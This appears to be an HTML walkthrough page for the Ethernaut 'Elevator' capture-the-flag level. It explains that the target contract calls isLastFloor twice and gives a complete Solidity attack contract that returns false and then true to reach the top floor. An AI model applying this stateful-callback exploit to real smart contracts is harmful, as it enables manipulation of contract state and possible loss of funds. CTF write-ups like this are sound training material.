@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 11: Elevator</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 11: Elevator</h1>
+
+        
+      </div>
+      
+        
+        <p><code>Elevator</code> calls <code>isLastFloor</code> twice:</p>
+<ol>
+<li>It only updates <code>floor</code> when <code>isLastFloor</code> is <code>false</code>.</li>
+<li>It then sets <code>top</code> to the value returned by <code>isLastFloor</code>.</li>
+</ol>
+<p>We simply keep track of whether <code>isLastFloor</code> was called before in order to
+return the required value.</p>
+
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./11_Elevator.sol&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ElevatorAttack</span> <span class="hljs-keyword">is</span> <span class="hljs-title">Building</span> </span>{
+    <span class="hljs-keyword">bool</span> isLastFloorWasCalled;
+    Elevator elevator;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"><span class="hljs-keyword">address</span> elevatorAddr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        elevator = Elevator(elevatorAddr);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goToTop</span> (<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        elevator.goTo(<span class="hljs-number">0</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isLastFloor</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
+        <span class="hljs-keyword">if</span> (isLastFloorWasCalled) {
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        } <span class="hljs-keyword">else</span> {
+            isLastFloorWasCalled = <span class="hljs-literal">true</span>;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        }
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
